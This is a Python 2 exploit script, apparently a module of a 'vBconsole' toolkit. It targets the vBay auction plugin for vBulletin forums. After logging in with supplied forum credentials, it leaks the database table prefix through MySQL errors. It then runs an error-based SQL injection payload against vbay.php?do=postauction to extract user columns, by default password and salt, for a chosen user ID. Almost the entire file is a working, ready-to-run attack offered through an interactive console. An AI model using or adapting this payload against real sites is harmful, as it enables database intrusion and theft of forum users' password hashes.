#!/usr/bin/env python
from includes.termcolor import colored
import urllib
import urllib2
import httplib
import cookielib
import pycurl
import cStringIO
import re
import HTMLParser
import urlparse
import md5


def get_server_status_code(url):
    host, path = urlparse.urlparse(url)[1:3]
    try:
        conn = httplib.HTTPConnection(host)
        conn.request('HEAD', path)
        return conn.getresponse().status
    except StandardError:
        return False
 
def check_url(url):
    good_codes = [httplib.OK, httplib.FOUND, httplib.MOVED_PERMANENTLY]
    return get_server_status_code(url) in good_codes

def login(url, username, password):
	url = url.replace("vbay.php?do=postauction", "login.php?do=login")
	if not check_url(url):
		print ('Login file does not exist at: '+url)
		print ('Check the host and path to make sure they are correct.')
		return False
	loginpassword = md5.md5(password).hexdigest()
	cookies = []
	postdata = [
	('do', 'login'),
	('vb_login_username', username),
	('vb_login_md5password', loginpassword),
	('cookieuser', '1')
	]
	postdata = urllib.urlencode(postdata)
	cookie_jar = cookielib.CookieJar()
	handeler = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar))
	handeler.open(url, postdata)
	for cookie in cookie_jar:
		cookies.append(cookie.name+'='+cookie.value)
	for cook in cookies:
		if 'bbuserid' in cook:
			return cookies

def get_table_prefix(url, username, password):
	if not login(url, username, password):
		print ('Login failed! Double check login credentials.')
		return False
	else:
		cookieopts = ";".join(login(url, username, password))
	postdata = [
	('type', "'")
	]
	postdata = urllib.urlencode(postdata)
	buf = cStringIO.StringIO()
	c = pycurl.Curl()
	c.setopt(c.URL, url)
	c.setopt(c.COOKIE, cookieopts)
	c.setopt(c.POSTFIELDS, postdata)
	c.setopt(c.WRITEFUNCTION, buf.write)
	c.perform()
	response = buf.getvalue()
	if 'MySQL Error' in response:
		prefix = re.search('INSERT INTO(.*)vbay_items', response).group(1).strip()
		if len(prefix) != 0:
			print ('Table prefix found: '+prefix)
		else:
			print ('No table prefix was found.')
	else:
		print ('The exploit was unsuccessful. Therefore no prefix was found.')
		print ('Check all vars and make sure they are correct.')
		print ('If everything is correct the site is either not vuln or they are using a newer vB version.')

def initiate():
	exvars = [
	['HOST', 'Not Set', 'Host of target with http://!'],
	['PATH', '/forums', 'Path to forums on target host'],
	['TABLE', 'user', 'User table to extract data from'],
	['USERNAME', 'Not Set', 'Valid username for target forum'],
	['PASSWORD', 'Not Set', 'Valid password for target forum'],
	['USERID', '1', 'Userid of to extract data for'],
	['COLUMNS', 'password,salt', 'Columns to extract data for. Seperate with a comma!!'],
	['SEPERATOR', ':', 'Seperator to seperate columns']
	]

	print ('\nType help for more information')
	while True:
		try:
			vbayinput = raw_input('vbconsole('+colored('/exploits/vbay', 'red')+')> ')
			if vbayinput == 'exit':
				print ("Going back to home.")
				break
			elif vbayinput == 'help':
				print ('show vars ~> Shows variables needed to run exploit and their current values')
				print ('set {VAR NAME} {VAR VALUE} ~> Set {VAR NAME} to {VAR VALUE}')
				print ('get prefix ~> Looks for table prefix')
				print ('run ~> Run the exploit')
				print ('exit ~> Go back to vBconsole home')
			elif vbayinput == 'show vars':
				print ("Variables needed to run exploit.\n")
				count = 0
				while count < len(exvars):
					print (exvars[count][0]+" = "+exvars[count][1]+" ("+exvars[count][2]+")")
					count += 1
			elif vbayinput[0:3] == 'set':
				setvar = vbayinput.split(' ')[1]
				setval = vbayinput.split(' ')[2:]
				count = 0
				while count < len(exvars):
					if exvars[count][0] == setvar:
						exvars[count][1] = " ".join(setval)
					count += 1
			elif vbayinput == 'get prefix':
				if exvars[0][1].endswith('/'):
					host = exvars[0][1][:-1]
				else:
					host = exvars[0][1]
				if exvars[1][1] != '/' and exvars[1][1].endswith('/'):
					path = exvars[1][1]+"vbay.php?do=postauction"
				elif exvars[1][1] == '/':
					path = exvars[1][1]+"vbay.php?do=postauction"
				else:
					path = exvars[1][1]+"/vbay.php?do=postauction"
				url = host+path
				if check_url(url):
					get_table_prefix(url, exvars[3][1], exvars[4][1])
				else:
					print ('vBay could not be found at: '+url)
			elif vbayinput == 'run':
				columns = exvars[6][1].split(',')
				if exvars[0][1].endswith('/'):
					host = exvars[0][1][:-1]
				else:
					host = exvars[0][1]
				if exvars[1][1] != '/' and exvars[1][1].endswith('/'):
					path = exvars[1][1]+"vbay.php?do=postauction"
				elif exvars[1][1] == '/':
					path = exvars[1][1]+"vbay.php?do=postauction"
				else:
					path = exvars[1][1]+"/vbay.php?do=postauction"
				url = host+path
				if login(url, exvars[3][1], exvars[4][1]):
					newcookielist = []
					for newlistvals in login(url, exvars[3][1], exvars[4][1]):
						newcookielist.append(newlistvals)
					cookieopts = ";".join(newcookielist)
					if check_url(url):
						results = []
						for cols in columns:
							postdata = [
							('type', "' and (select 1 from (select count(*),concat((select(select concat(cast(concat("+cols+") as char),0x7e)) from "+exvars[2][1]+" WHERE userid="+exvars[5][1]+" limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ''='")
							]
							postdata = urllib.urlencode(postdata)
							buf = cStringIO.StringIO()
							c = pycurl.Curl()
							c.setopt(c.URL, url)
							c.setopt(c.COOKIE, cookieopts)
							c.setopt(c.POSTFIELDS, postdata)
							c.setopt(c.WRITEFUNCTION, buf.write)
							c.perform()
							response = buf.getvalue()
							for search in response.split("\n"):
								if 'Duplicate entry' in search:
									result = search.strip()
									result = result.replace('MySQL Error', '')
									result = result.replace('Duplicate entry', '')
									result = result.replace('for key 1', '')
									result = result.strip()
									result = result.strip(':')
									result = result.strip()
									result = result.strip('\'')
									code = 0
									break
								elif 'MySQL Error' in search: 
									result = search.strip()
									result = result.replace('MySQL Error', '')
									result = result.strip()
									result = result.strip(':')
									result = result.strip()
									code = 1
									break
								else:
									code = 2
							if code == 0:
								h = HTMLParser.HTMLParser()
								unescaped = h.unescape(result)
								if unescaped.endswith('~1'):
									print (cols+': '+unescaped.strip('~1'))
									results.append(unescaped.strip('~1'))
								elif unescaped.endswith('~'):
									print (cols+': '+unescaped.strip('~'))
									results.append(unescaped.strip('~'))
								else:
									print (cols+': '+unescaped)
									results.append(unescaped)
							elif code == 1:
								print ('MySQL Error: '+result)
							else:
								print ('Exploit was unsuccessful!')
								print ('There could be various reasons for this:')
								print ('The userid you chose could be invalid')
								print ('The forum could be running a newer version of vB eliminating DB errors in the source')
								print ('I have also had sites not work without www. during testing')
								break
							buf.close()
						if len(results) != 0:
							line = exvars[7][1].join(results)
							print ('\n'+line)
					else:
						print ('vBay could not be found at: '+url)
				else:
					print ('Login failed!')
		except KeyboardInterrupt:
			print ("\nGoing back to home.")
			break
